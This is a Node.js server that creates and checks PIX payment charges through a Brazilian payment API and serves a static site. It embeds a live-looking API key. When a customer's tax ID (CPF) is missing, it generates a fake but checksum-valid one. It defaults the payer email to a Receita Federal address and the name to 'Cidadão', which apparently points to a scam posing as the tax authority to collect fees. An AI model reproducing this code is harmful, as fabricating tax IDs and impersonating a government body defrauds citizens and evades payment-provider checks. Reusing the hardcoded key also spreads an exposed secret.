const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const API_KEY = 'cpk_live_ex84lopcp2xexagmazz6za11';
const API_URL = 'https://api.xpaybrasil.com/v1';

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css',
  '.js': 'text/javascript',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.mp4': 'video/mp4',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.eot': 'application/vnd.ms-fontobject'
};

function generateCPF() {
  const rnd = n => Math.round(Math.random() * n);
  const mod = (dividendo, divisor) => Math.round(dividendo - (Math.floor(dividendo / divisor) * divisor));
  const n = Array(9).fill(0).map(() => rnd(9));
  let d1 = n.reduce((total, number, index) => (2 + index) * number + total, 0);
  d1 = 11 - mod(d1, 11);
  if (d1 >= 10) d1 = 0;
  let d2 = d1 * 2 + n.reduce((total, number, index) => (3 + index) * number + total, 0);
  d2 = 11 - mod(d2, 11);
  if (d2 >= 10) d2 = 0;
  return `${n.reverse().join('')}${d1}${d2}`;
}

const server = http.createServer(async (req, res) => {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    return res.end();
  }

  const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
  const pathname = parsedUrl.pathname;

  // Endpoint de pagamento (tanto /pagamento.php quanto /api/pagamento)
  if (pathname === '/pagamento.php' || pathname === '/api/pagamento') {
    if (req.method === 'GET') {
      const chargeId = parsedUrl.searchParams.get('id');
      if (!chargeId) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'ID da cobrança ausente' }));
      }
      try {
        const xpayRes = await fetch(`${API_URL}/charge/${encodeURIComponent(chargeId)}`, {
          headers: { 'X-API-KEY': API_KEY }
        });
        const json = await xpayRes.json();
        const paymentStatus = json.data?.paymentStatus || json.paymentStatus || 'PROCESSING';
        const status = json.data?.status || json.status || 'OPEN';
        res.writeHead(xpayRes.status, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({
          success: xpayRes.ok,
          paymentStatus,
          status,
          paid: ['PAID', 'RECIEVED', 'RECEIVED'].includes(paymentStatus) || status === 'COMPLETED',
          raw: json
        }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: false, error: err.message }));
      }
    } else if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => body += chunk);
      req.on('end', async () => {
        try {
          const input = body ? JSON.parse(body) : {};
          let cpf = (input.cpf || input.taxId || input.customer?.taxId || '').replace(/\D/g, '');
          if (cpf.length !== 11 || /^(.)\1+$/.test(cpf)) {
            cpf = generateCPF();
          }
          const name = input.name || input.nome || input.customer?.name || 'Cidadão';
          const email = input.email || input.customer?.email || 'pagamento@receita.gov.br';
          const phone = (input.phone || input.telefone || input.customer?.phone || '11987654321').replace(/\D/g, '');
          const amount = input.amount || 6825;

          const payload = {
            amount,
            customer: {
              name,
              taxId: cpf,
              email,
              phone: phone.length >= 10 ? phone : '11987654321'
            }
          };

          const xpayRes = await fetch(`${API_URL}/charge/pix`, {
            method: 'POST',
            headers: {
              'X-API-KEY': API_KEY,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          });
          const json = await xpayRes.json();
          res.writeHead(xpayRes.status, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({
            success: xpayRes.ok,
            ...json
          }));
        } catch (err) {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ success: false, error: err.message }));
        }
      });
      return;
    }
  }

  // Static files serving
  let filePath = path.join(__dirname, pathname === '/' ? 'index.html' : pathname);
  if (!fs.existsSync(filePath)) {
    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end('Arquivo não encontrado');
  }

  const stat = fs.statSync(filePath);
  if (stat.isDirectory()) {
    filePath = path.join(filePath, 'index.html');
  }

  const ext = path.extname(filePath).toLowerCase();
  const contentType = MIME_TYPES[ext] || 'application/octet-stream';

  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('Erro ao ler arquivo');
    }
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
